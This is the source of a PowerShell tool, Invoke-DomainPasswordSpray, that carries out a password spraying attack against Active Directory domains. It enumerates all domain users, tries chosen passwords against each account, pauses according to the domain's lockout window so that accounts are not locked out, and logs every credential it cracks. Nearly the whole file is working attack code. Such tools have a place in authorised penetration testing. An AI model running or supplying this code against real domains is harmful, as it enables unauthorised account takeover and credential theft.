function Invoke-DomainPasswordSpray{
<#
.SYNOPSIS

This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.

PivotAll Function: Invoke-DomainPasswordSpray
Author: Beau Bullock (@dafthack) and Brian Fehrman (@fullmetalcache)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.

.PARAMETER UserList

Optional UserList parameter. This will be generated automatically if not specified.

.PARAMETER Password

A single password that will be used to perform the password spray.

.PARAMETER PasswordList

A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).

.PARAMETER OutFile

A file to output the results to.

.EXAMPLE

C:\PS> Invoke-DomainPasswordSpray -Password Winter2016

Description
-----------
This command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.

.EXAMPLE

C:\PS> Invoke-DomainPasswordSpray -UserList users.txt -PasswordList passlist.txt -OutFile

Description
-----------
This command will use the userlist at users.txt and try to authenticate using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to 1 attempt during each window.


#>
Param(

 [Parameter(Position = 0, Mandatory = $false)]
 [string]
 $UserList = "",

 [Parameter(Position = 1, Mandatory = $false)]
 [string]
 $Password,

 [Parameter(Position = 2, Mandatory = $false)]
 [string]
 $PasswordList,

 [Parameter(Position = 3, Mandatory = $false)]
 [string]
 $OutFile
)

If ($UserList -eq "") 
{
    #Create a list of all domain users if not specified
    Write-Host -ForegroundColor "yellow" "[*] Making a list of all domain users"
    $net_users = "cmd.exe /C net users /domain"
    $raw_users = Invoke-Expression -Command:$net_users
    # Moving Net Users output to one username per line
    $stripped_users = ($raw_users | select -Skip 6 | Where-Object {$_ -notmatch 'The command completed successfully.'}) 
    $one_user_per_line = $stripped_users -Replace '\s+',"`r`n"
    $newout = $one_user_per_line | Sort-Object | Get-Unique
    $nextout = $newout -Replace ' ', ""
    foreach ($line in $nextout)
    {
        if ($line -ne "`r`n")
        {
            $UserList += $line
        }
    }
    $userlistb = @()
    $UserList | Out-File -Encoding ascii "temp-users.txt"
    $userlistb = Get-Content "temp-users.txt"
    Write-Host "[*] Using a userlist gathered from the current user's domain to spray with"
}
else
{
    Write-Host "[*] Using $UserList as userlist to spray with"
    $userlistb = @()
    try 
    {
        $userlistb = Get-Content $UserList -ErrorAction stop
    }
    catch [Exception]{
        Write-Host -ForegroundColor "red" "$_.Exception"
        break
    }
    
}
    # If a single password is selected do this
$CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
if ($Password)
{
$time = Get-Date
Write-Host -ForegroundColor Yellow "[*] Password spraying has started. Current time is $($time.ToShortTimeString())"
Write-Host "[*] This might take a while depending on the total number of users"
$curr_user = 0
$count = $userlistb.count

ForEach($User in $userlistb){
$Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
    If ($Domain_check.name -ne $null)
    {
        if ($OutFile -ne "")
        {    
            Add-Content $OutFile $User`:$Password
        }
    Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
    }
    $curr_user+=1 
    Write-Host -nonewline "$curr_user of $count users tested`r"
    }
Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
Remove-Item "temp-users.txt" -Force
}
    # If a password list is selected do this
ElseIf($PasswordList){
    $Passwords = Get-Content $PasswordList

    $net_accounts = "cmd.exe /C net accounts /domain > password-policy.txt"
    Invoke-Expression -Command:$net_accounts

    $stripped_policy = (Get-Content -Encoding Ascii "password-policy.txt" | Where-Object {$_ -like "*Lockout Observation Window*"}) 
    $stripped_split_a, $stripped_split_b = $stripped_policy.split(':',2)
    $observation_window_no_spaces = $stripped_split_b -Replace '\s+',""
    [int]$observation_window = [convert]::ToInt32($observation_window_no_spaces, 10)
    Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"    
    Write-Host -ForegroundColor Yellow "[*] The domain password policy observation window is set to $observation_window minutes."
    Write-Host "[*] Setting a $observation_window minute wait in between sprays."
    Start-Sleep -Seconds 5

    Write-Host -ForegroundColor Yellow "[*] Password spraying has started."
    Write-Host "[*] This might take a while depending on the total number of users"

        ForEach($Password_Item in $Passwords){
            $time = Get-Date
            Write-Host "[*] Now trying password $Password_Item. Current time is $($time.ToShortTimeString())"
            $curr_user = 0
            $Users = Get-Content $UserList
            $count = $Users.count

            ForEach($User in $Users){
            $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password_Item)
            If ($Domain_check.name -ne $null)
            {
                if ($OutFile -ne "")
                {
                Add-Content $OutFile $User`:$Password_Item
                }
            Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password_Item"
            }
            $curr_user+=1 
            Write-Host -nonewline "$curr_user of $count users tested`r"
            }
            Countdown-Timer -Seconds (60*$observation_window)
        }
        Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
Remove-Item "password-policy.txt" -Force
Remove-Item "temp-users.txt" -Force
}
Else{
Write-Host -ForegroundColor Red "The -Password or -PasswordList option must be specified"
break
}
}
Function Countdown-Timer
{   
    Param(
        $Seconds = 1800,
        $Message = "[*] Pausing to avoid account lockout."
    )
    ForEach ($Count in (1..$Seconds))
    {   Write-Progress -Id 1 -Activity $Message -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining" -PercentComplete (($Count / $Seconds) * 100)
        Start-Sleep -Seconds 1
    }
    Write-Progress -Id 1 -Activity $Message -Status "Completed" -PercentComplete 100 -Completed
}

